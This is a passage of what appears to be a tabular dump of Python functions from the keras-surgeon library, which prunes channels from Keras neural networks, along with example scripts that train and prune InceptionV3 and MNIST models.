        outbound_mask = np.transpose(inbound_masks, [x - 1 for x in layer.dims])
        new_layer = layer
    elif layer_class == 'RepeatVector':
        outbound_mask = np.repeat(np.expand_dims(inbound_masks, 0), layer.n, axis=0)
        new_layer = layer
    elif layer_class == 'Embedding':
        if inbound_masks is not None:
            raise ValueError('Channels cannot be deleted bedore Embedding layers because they change the number of channels.')
        outbound_mask = None
        new_layer = layer
    elif layer_class in ('Add', 'Multiply', 'Average', 'Maximum'):
        if not utils.all_equal(inbound_masks):
            ValueError('{0} layers must have the same size inputs. All inbound nodes must have the same channels deleted'.format(layer_class))
        outbound_mask = inbound_masks[1]
        new_layer = layer
    elif layer_class == 'Concatenate':
        axis = layer.axis
        if layer.axis < 0:
            axis = axis % len(layer.input_shape[0])
        outbound_mask = np.concatenate(inbound_masks, axis=axis - 1)
        new_layer = layer
    elif layer_class in ('SimpleRNN', 'GRU', 'LSTM'):
        if np.all(inbound_masks):
            new_layer = layer
        else:
            weights = layer.get_weights()
            weights[0] = weights[0][np.where(inbound_masks[0, :])[0], :]
            config = layer.get_config()
            config['weights'] = weights
            new_layer = type(layer).from_config(config)
        outbound_mask = None
    elif layer_class == 'BatchNormalization':
        outbound_mask = inbound_masks
        index = [0] * len(input_shape)
        assert len(layer.axis) == 1
        index[layer.axis[0]] = slice(None)
        index = index[1:]
        channel_indices = np.where(inbound_masks[tuple(index)] == False)[0]
        weights = [np.delete(w, channel_indices, axis=-1) for w in layer.get_weights()]
        new_layer = BatchNormalization.from_config(layer.get_config())
        new_input_shape = list(input_shape)
        assert len(new_layer.axis) == 1
        new_input_shape[new_layer.axis[0]] -= len(channel_indices)
        new_layer.build(new_input_shape)
        new_layer.set_weights(weights)
    else:
        raise ValueError('""{0}"" layers are currently unsupported.'.format(layer_class))
    if len(layer.inbound_nodes) > 1 and new_layer != layer:
        self._replace_layers_map[layer] = (new_layer, outbound_mask)
    return (new_layer, outbound_mask)"
BenWhetton/keras-surgeon,_delete_channel_weights,"def _delete_channel_weights(self, layer, channel_indices):
    """"""Delete channels from layer and remove the corresponding weights.

        Arguments:
            layer: A layer whose channels are to be deleted
            channel_indices: The indices of the channels to be deleted.

        Returns:
            A new layer with the channels and corresponding weights deleted.
        """"""
    layer_config = layer.get_config()
    channels_attr = utils.get_channels_attr(layer)
    channel_count = layer_config[channels_attr]
    if any([i + 1 > channel_count for i in channel_indices]):
        raise ValueError('Channels_index value(s) out of range. This layer only has {0} channels.'.format(channel_count))
    print('Deleting {0}/{1} channels from layer: {2}'.format(len(channel_indices), channel_count, layer.name))
    channel_indices = [i % channel_count for i in channel_indices]
    layer_config[channels_attr] -= len(channel_indices)
    if layer.__class__.__name__ == 'SimpleRNN':
        weights = [np.delete(w, channel_indices, axis=-1) for w in layer.get_weights()]
        weights[1] = np.delete(weights[1], channel_indices, axis=0)
    elif layer.__class__.__name__ == 'GRU':
        channel_indices_gru = [layer.units * m + i for m in range(3) for i in channel_indices]
        weights = [np.delete(w, channel_indices_gru, axis=-1) for w in layer.get_weights()]
        weights[1] = np.delete(weights[1], channel_indices, axis=0)
    elif layer.__class__.__name__ == 'LSTM':
        channel_indices_lstm = [layer.units * m + i for m in range(4) for i in channel_indices]
        weights = [np.delete(w, channel_indices_lstm, axis=-1) for w in layer.get_weights()]
        weights[1] = np.delete(weights[1], channel_indices, axis=0)
    else:
        weights = [np.delete(w, channel_indices, axis=-1) for w in layer.get_weights()]
    layer_config['weights'] = weights
    return type(layer).from_config(layer_config)"
BenWhetton/keras-surgeon,_make_delete_mask,"def _make_delete_mask(self, layer, channel_indices):
    """"""Make the boolean delete mask for layer's output deleting channels.

        The mask is used to remove the weights of the downstream layers which
        were connected to channels which have been deleted in this layer.
        The mask is a boolean array with the same size as the layer output
        excluding the first (batch) dimension.
        All elements of the mask corresponding to the removed channels are set
        to False. Other elements are set to True.

        Arguments:
            layer: A layer
            channel_indices: The indices of the channels to be deleted.

        Returns:
            A Numpy array of booleans of the same size as the output of layer
            excluding the batch dimension.
        """"""
    data_format = getattr(layer, 'data_format', 'channels_last')
    new_delete_mask = np.ones(layer.output_shape[1:], dtype=bool)
    if data_format == 'channels_first':
        new_delete_mask[channel_indices, ...] = False
    elif data_format == 'channels_last':
        new_delete_mask[..., channel_indices] = False
    else:
        ValueError('Invalid data_format property value')
    return new_delete_mask"
BenWhetton/keras-surgeon,_rebuild_rec,"def _rebuild_rec(node):
    """"""Rebuild the graph up to `node` recursively.

            Args:
                node(Node): Node to rebuild up to.
            Returns:
                (tuple) containing :
                The output tensor of the rebuilt `node`
                The output mask of the rebuilt `node`

            """"""
    layer = node.outbound_layer
    logging.debug('getting inputs for: {0}'.format(layer.name))
    node_output = utils.single_element(node.output_tensors)
    if node_output in self._replace_tensors.keys():
        logging.debug('bottomed out at replaced output: {0}'.format(node_output))
        (output, output_mask) = self._replace_tensors[node_output]
        return (output, output_mask)
    elif node in self._finished_nodes.keys():
        logging.debug('reached finished node: {0}'.format(node))
        return self._finished_nodes[node]
    mask_map = TensorDict()
    for (input, mask) in zip(graph_inputs, graph_input_masks):
        mask_map[input] = mask
    try:
        output_mask = mask_map[node_output]
        logging.debug('bottomed out at a model input')
        return (node_output, output_mask)
    except KeyError:
        inbound_nodes = node_utils.parent_nodes(node)
        logging.debug('inbound_layers: {0}'.format([node.outbound_layer.name for node in inbound_nodes]))
        (inputs, input_masks) = zip(*[_rebuild_rec(n) for n in inbound_nodes])
        if all((i is None for i in inputs)):
            output = None
            try:
                assert len(node.output_tensors) <= 1
            except AssertionError as e:
                raise e
            except:
                pass
            output_mask = np.zeros(node.output_tensors.shape[1:], dtype=bool)
        elif any((i is None for i in inputs)):
            if node.outbound_layer.__class__.__name__ != 'Concatenate':
                TypeError('Inputs can only be missing for concatenate layers.')
            inputs = [i for i in inputs if i is not None]
            (new_layer, output_mask) = self._apply_delete_mask(node, input_masks)
            if len(inputs) == 1:
                output = utils.single_element(list(inputs))
            else:
                output = new_layer(utils.single_element(list(inputs)))
        else:
            (new_layer, output_mask) = self._apply_delete_mask(node, input_masks)
            output = new_layer(utils.single_element(list(inputs)))
        self._finished_nodes[node] = (output, output_mask)
        logging.debug('layer complete: {0}'.format(layer.name))
        return (output, output_mask)"
BenWhetton/keras-surgeon,clean_copy,"def clean_copy(model):
    """"""Returns a copy of the model without other model uses of its layers.""""""
    weights = model.get_weights()
    new_model = model.__class__.from_config(model.get_config())
    new_model.set_weights(weights)
    return new_model"
BenWhetton/keras-surgeon,get_channels_attr,"def get_channels_attr(layer):
    layer_config = layer.get_config()
    if 'units' in layer_config.keys():
        channels_attr = 'units'
    elif 'filters' in layer_config.keys():
        channels_attr = 'filters'
    else:
        raise ValueError('This layer has not got any channels.')
    return channels_attr"
BenWhetton/keras-surgeon,get_node_depth,"def get_node_depth(model, node):
    """"""Get the depth of a node in a model.

    Arguments:
        model: Keras Model object
        node: Keras Node object

    Returns:
        The node depth as an integer. The model outputs are at depth 0.

    Raises:
        KeyError: if the node is not contained in the model.
    """"""
    for (depth, nodes_at_depth) in model._nodes_by_depth.items():
        if node in nodes_at_depth:
            return depth
    raise KeyError('The node is not contained in the model.')"
BenWhetton/keras-surgeon,check_for_layer_reuse,"def check_for_layer_reuse(model, layers=None):
    """"""Returns True if any layers are reused, False if not.""""""
    if layers is None:
        layers = model.layers
    return any([len(l.inbound_nodes) > 1 for l in layers])"
BenWhetton/keras-surgeon,find_nodes_in_model,"def find_nodes_in_model(model, layer):
    """"""Find the indices of layer's inbound nodes which are in model""""""
    model_nodes = get_model_nodes(model)
    node_indices = []
    for (i, node) in enumerate(layer.inbound_nodes):
        if node in model_nodes:
            node_indices.append(i)
    return node_indices"
BenWhetton/keras-surgeon,check_nodes_in_model,"def check_nodes_in_model(model, nodes):
    """"""Check if nodes are in model""""""
    model_nodes = get_model_nodes(model)
    nodes_in_model = [False] * len(nodes)
    for (i, node) in enumerate(nodes):
        if node in model_nodes:
            nodes_in_model[i] = True
    return nodes_in_model"
BenWhetton/keras-surgeon,get_model_nodes,"def get_model_nodes(model):
    """"""Return all nodes in the model""""""
    return [node for v in model._nodes_by_depth.values() for node in v]"
BenWhetton/keras-surgeon,get_shallower_nodes,"def get_shallower_nodes(node):
    possible_nodes = node.outbound_layer.outbound_nodes
    next_nodes = []
    for n in possible_nodes:
        if node in node_utils.parent_nodes(n):
            next_nodes.append(n)
    return next_nodes"
BenWhetton/keras-surgeon,get_node_index,"def get_node_index(node):
    for (i, n) in enumerate(node.outbound_layer.inbound_nodes):
        if node == n:
            return i"
BenWhetton/keras-surgeon,find_activation_layer,"def find_activation_layer(layer, node_index):
    """"""

    Args:
        layer(Layer):
        node_index:
    """"""
    output_shape = layer.get_output_shape_at(node_index)
    maybe_layer = layer
    node = maybe_layer.inbound_nodes[node_index]
    while True:
        activation = getattr(maybe_layer, 'activation', linear)
        if activation.__name__ != 'linear':
            if maybe_layer.get_output_shape_at(node_index) != output_shape:
                ValueError('The activation layer ({0}), does not have the same output shape as {1}'.format(maybe_layer.name, layer.name))
            return (maybe_layer, node_index)
        next_nodes = get_shallower_nodes(node)
        if len(next_nodes) > 1:
            ValueError('The model must not branch between the chosen layer and the activation layer.')
        node = next_nodes[0]
        node_index = get_node_index(node)
        maybe_layer = node.outbound_layer
        if maybe_layer.weights and (not maybe_layer.__class__.__name__.startswith('Global')):
            AttributeError('There is no nonlinear activation layer between {0} and {1}'.format(layer.name, maybe_layer.name))"
BenWhetton/keras-surgeon,sort_x_by_y,"def sort_x_by_y(x, y):
    """"""Sort the iterable x by the order of iterable y""""""
    x = [x for (_, x) in sorted(zip(y, x))]
    return x"
BenWhetton/keras-surgeon,single_element,"def single_element(x):
    """"""If x contains a single element, return it; otherwise return x""""""
    if isinstance(x, tf.Tensor):
        return x
    if len(x) == 1:
        x = x[0]
    return x"
BenWhetton/keras-surgeon,get_one_tensor,"def get_one_tensor(x):
    if isinstance(x, tf.Tensor):
        return x
    assert len(x) == 1
    return x[0]"
BenWhetton/keras-surgeon,bool_to_index,"def bool_to_index(x):
    return [i for (i, v) in enumerate(x) if v]"
BenWhetton/keras-surgeon,all_equal,"def all_equal(iterator):
    try:
        iterator = iter(iterator)
        first = next(iterator)
        return all((np.array_equal(first, rest) for rest in iterator))
    except StopIteration:
        return True"
BenWhetton/keras-surgeon,__init__,"def __init__(self, sum_axis):
    self.values = None
    self.n = 0
    self.sum_axis = sum_axis"
BenWhetton/keras-surgeon,add,"def add(self, v):
    if self.values is None:
        self.values = v.sum(axis=self.sum_axis)
    else:
        self.values += v.sum(axis=self.sum_axis)
    self.n += v.shape[self.sum_axis]"
BenWhetton/keras-surgeon,calculate,"def calculate(self):
    return self.values / self.n"
BenWhetton/keras-surgeon,inbound_nodes,"def inbound_nodes(layer):
    return layer.inbound_nodes"
BenWhetton/keras-surgeon,make_list_if_not,"def make_list_if_not(x):
    if isinstance(x, collections.abc.Sequence) and (not isinstance(x, str)):
        return x
    else:
        return [x]"
BenWhetton/keras-surgeon,node_indices,"def node_indices(node):
    return make_list_if_not(node.node_indices)"
BenWhetton/keras-surgeon,inbound_layers,"def inbound_layers(node):
    return make_list_if_not(node.inbound_layers)"
BenWhetton/keras-surgeon,parent_nodes,"def parent_nodes(node):
    try:
        return node.parent_nodes
    except AttributeError:
        return [layer_utils.inbound_nodes(inbound_layers(node)[i])[node_index] for (i, node_index) in enumerate(node_indices(node))]"
BenWhetton/keras-surgeon,__init__,"def __init__(self, refs):
    super().__init__(refs)"
BenWhetton/keras-surgeon,__contains__,"def __contains__(self, item):
    try:
        return super().__contains__(item.ref())
    except AttributeError:
        return super().__contains__(item.experimental_ref())"
BenWhetton/keras-surgeon,__init__,"def __init__(self):
    super().__init__()"
BenWhetton/keras-surgeon,__setitem__,"def __setitem__(self, key, value):
    try:
        super().__setitem__(key.ref(), value)
    except AttributeError:
        super().__setitem__(key.experimental_ref(), value)"
BenWhetton/keras-surgeon,__getitem__,"def __getitem__(self, item):
    try:
        return super().__getitem__(item.ref())
    except AttributeError:
        return super().__getitem__(item.experimental_ref())"
BenWhetton/keras-surgeon,keys,"def keys(self):
    return TensorKeys(super().keys())"
BenWhetton/keras-surgeon,iterative_prune_model,"def iterative_prune_model():
    base_model = inception_v3.InceptionV3(include_top=False, weights='imagenet', pooling='avg', input_shape=(299, 299, 3))
    print('Model loaded.')
    top_output = Dense(5, activation='softmax')(base_model.output)
    model = Model(base_model.inputs, top_output)
    del base_model
    model.load_weights(tuned_weights_path)
    model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.0001, momentum=0.9), metrics=['accuracy'])
    train_datagen = ImageDataGenerator(preprocessing_function=inception_v3.preprocess_input, shear_range=0.2, zoom_range=0.2, horizontal_flip=True)
    train_generator = train_datagen.flow_from_directory(train_data_dir, target_size=(img_height, img_width), batch_size=batch_size, class_mode='categorical')
    train_steps = train_generator.n // train_generator.batch_size
    test_datagen = ImageDataGenerator(preprocessing_function=inception_v3.preprocess_input)
    validation_generator = test_datagen.flow_from_directory(validation_data_dir, target_size=(img_height, img_width), batch_size=val_batch_size, class_mode='categorical')
    val_steps = validation_generator.n // validation_generator.batch_size
    loss = model.evaluate(validation_generator)
    print('original model validation loss: ', loss[0], ', acc: ', loss[1])
    total_channels = get_total_channels(model)
    n_channels_delete = int(math.floor(percent_pruning / 100 * total_channels))
    percent_pruned = 0
    if percent_pruned > 0:
        checkpoint_name = 'inception_flowers_pruning_' + str(percent_pruned) + 'percent'
        model = load_model(output_dir + checkpoint_name + '.h5')
    while percent_pruned <= total_percent_pruning:
        apoz_df = get_model_apoz(model, validation_generator)
        percent_pruned += percent_pruning
        print('pruning up to ', str(percent_pruned), '% of the original model weights')
        model = prune_model(model, apoz_df, n_channels_delete)
        checkpoint_name = 'inception_flowers_pruning_' + str(percent_pruned) + 'percent'
        model.save(output_dir + checkpoint_name + '.h5')
        del model
        K.clear_session()
        tf.compat.v1.reset_default_graph()
        model = load_model(output_dir + checkpoint_name + '.h5')
        model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.0001, momentum=0.9), metrics=['accuracy'])
        checkpoint_name = 'inception_flowers_pruning_' + str(percent_pruned) + 'percent'
        csv_logger = CSVLogger(output_dir + checkpoint_name + '.csv')
        model.fit(train_generator, epochs=epochs, validation_data=validation_generator, workers=4, callbacks=[csv_logger])
    loss = model.evaluate(validation_generator)
    print('pruned model loss: ', loss[0], ', acc: ', loss[1])"
BenWhetton/keras-surgeon,prune_model,"def prune_model(model, apoz_df, n_channels_delete):
    sorted_apoz_df = apoz_df.sort_values('apoz', ascending=False)
    high_apoz_index = sorted_apoz_df.iloc[0:n_channels_delete, :]
    surgeon = Surgeon(model, copy=True)
    for name in high_apoz_index.index.unique().values:
        channels = list(pd.Series(high_apoz_index.loc[name, 'index'], dtype=np.int64).values)
        surgeon.add_job('delete_channels', model.get_layer(name), channels=channels)
    return surgeon.operate()"
BenWhetton/keras-surgeon,get_total_channels,"def get_total_channels(model):
    start = None
    end = None
    channels = 0
    for layer in model.layers[start:end]:
        if layer.__class__.__name__ == 'Conv2D':
            channels += layer.filters
    return channels"
BenWhetton/keras-surgeon,get_model_apoz,"def get_model_apoz(model, generator):
    start = None
    end = None
    apoz = []
    for layer in model.layers[start:end]:
        if layer.__class__.__name__ == 'Conv2D':
            print(layer.name)
            apoz.extend([(layer.name, i, value) for (i, value) in enumerate(get_apoz(model, layer, generator))])
    (layer_name, index, apoz_value) = zip(*apoz)
    apoz_df = pd.DataFrame({'layer': layer_name, 'index': index, 'apoz': apoz_value})
    apoz_df = apoz_df.set_index('layer')
    return apoz_df"
BenWhetton/keras-surgeon,save_bottleneck_features,"def save_bottleneck_features():
    model = inception_v3.InceptionV3(include_top=False, weights='imagenet', input_tensor=None, input_shape=None, pooling='avg')
    datagen = ImageDataGenerator(preprocessing_function=inception_v3.preprocess_input)
    train_data = datagen.flow_from_directory(train_data_dir, target_size=(img_width, img_height), batch_size=batch_size, class_mode='sparse', shuffle=False)
    features = model.predict(train_data)
    labels = np.eye(train_data.num_classes, dtype='uint8')[train_data.classes]
    np.save(output_dir + 'bottleneck_features_train.npy', features)
    np.save(output_dir + 'bottleneck_labels_train.npy', labels)
    val_data = datagen.flow_from_directory(validation_data_dir, target_size=(img_width, img_height), batch_size=batch_size, class_mode=None, shuffle=False)
    features = model.predict(val_data)
    labels = np.eye(val_data.num_classes, dtype='uint8')[val_data.classes]
    np.save(output_dir + 'bottleneck_features_validation.npy', features)
    np.save(output_dir + 'bottleneck_labels_validation.npy', labels)"
BenWhetton/keras-surgeon,train_top_model,"def train_top_model():
    train_features = np.load(output_dir + 'bottleneck_features_train.npy')
    train_labels = np.load(output_dir + 'bottleneck_labels_train.npy')
    validation_features = np.load(output_dir + 'bottleneck_features_validation.npy')
    validation_labels = np.load(output_dir + 'bottleneck_labels_validation.npy')
    top_input = Input(shape=train_features.shape[1:])
    top_output = Dense(5, activation='softmax')(top_input)
    model = Model(top_input, top_output)
    model.compile(optimizer=SGD(lr=0.0001, momentum=0.9), loss='categorical_crossentropy', metrics=['accuracy'])
    csv_logger = CSVLogger(output_dir + 'top_model_training.csv')
    model.fit(train_features, train_labels, epochs=top_epochs, batch_size=batch_size, validation_data=(validation_features, validation_labels), callbacks=[csv_logger])
    model.save_weights(top_model_weights_path)"
BenWhetton/keras-surgeon,tune_model,"def tune_model():
    base_model = inception_v3.InceptionV3(include_top=False, weights='imagenet', pooling='avg')
    print('Model loaded.')
    top_input = Input(shape=base_model.output_shape[1:])
    top_output = Dense(5, activation='softmax')(top_input)
    top_model = Model(top_input, top_output)
    top_model.load_weights(top_model_weights_path)
    model = Model(inputs=base_model.inputs, outputs=top_model(base_model.outputs))
    last_train_layer = model.get_layer(name='mixed8')
    for layer in model.layers[:model.layers.index(last_train_layer)]:
        layer.trainable = False
    model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.0001, momentum=0.9), metrics=['accuracy'])
    train_datagen = ImageDataGenerator(preprocessing_function=inception_v3.preprocess_input, shear_range=0.2, zoom_range=0.2, horizontal_flip=True)
    test_datagen = ImageDataGenerator(preprocessing_function=inception_v3.preprocess_input)
    train_generator = train_datagen.flow_from_directory(train_data_dir, target_size=(img_height, img_width), batch_size=batch_size, class_mode='categorical')
    validation_generator = test_datagen.flow_from_directory(validation_data_dir, target_size=(img_height, img_width), batch_size=batch_size, class_mode='categorical')
    loss = model.evaluate(validation_generator)
    print('Model validation performance before fine-tuning:', loss)
    csv_logger = CSVLogger(output_dir + 'model_tuning.csv')
    model.fit(train_generator, epochs=tune_epochs, validation_data=validation_generator, workers=4, callbacks=[csv_logger])
    model.save_weights(tuned_weights_path)"
BenWhetton/keras-surgeon,to_onehot,"def to_onehot(a, n):
    b = np.zeros((a.size, n + 1))
    b[np.arange(a.size), a] = 1
    return b"
BenWhetton/keras-surgeon,main,"def main():
    training_verbosity = 2
    ((train_images, train_labels), (val_images, val_labels)) = load_data()
    train_images = np.expand_dims(train_images, 3)
    train_labels = to_onehot(train_labels, 9)
    val_images = np.expand_dims(val_images, 3)
    val_labels = to_onehot(val_labels, 9)
    model = Sequential()
    model.add(Conv2D(20, [3, 3], input_shape=[28, 28, 1], activation='relu', name='conv_1'))
    model.add(MaxPool2D())
    model.add(Conv2D(50, [3, 3], activation='relu', name='conv_2'))
    model.add(MaxPool2D())
    model.add(layers.Permute((2, 1, 3)))
    model.add(Flatten())
    model.add(Dense(500, activation='relu', name='dense_1'))
    model.add(Dense(10, activation='softmax', name='dense_2'))
    model.summary()
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
    early_stopping = callbacks.EarlyStopping(monitor='val_loss', min_delta=0, patience=10, verbose=training_verbosity, mode='auto')
    reduce_lr = callbacks.ReduceLROnPlateau(monitor='val_loss', factor=0.1, patience=5, verbose=training_verbosity, mode='auto', min_delta=0.0001, cooldown=0, min_lr=0)
    results = model.fit(train_images, train_labels, epochs=200, batch_size=128, verbose=2, validation_data=(val_images, val_labels), callbacks=[early_stopping, reduce_lr])
    loss = model.evaluate(val_images, val_labels, batch_size=128, verbose=2)
    print('original model loss:', loss, '\n')
    layer_name = 'dense_1'
    while True:
        layer = model.get_layer(name=layer_name)
        apoz = identify.get_apoz(model, layer, val_images)
        high_apoz_channels = identify.high_apoz(apoz, 'both')
        model = delete_channels(model, layer, high_apoz_channels)
        model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])
        loss = model.evaluate(val_images, val_labels, batch_size=128, verbose=2)
        print('model loss after pruning: ', loss, '\n')
        results = model.fit(train_images, train_labels, epochs=200, batch_size=128, verbose=training_verbosity, validation_data=(val_images, val_labels), callbacks=[early_stopping, reduce_lr])
        loss = model.evaluate(val_images, val_labels, batch_size=128, verbose=2)
        print('model loss after retraining: ', loss, '\n')"
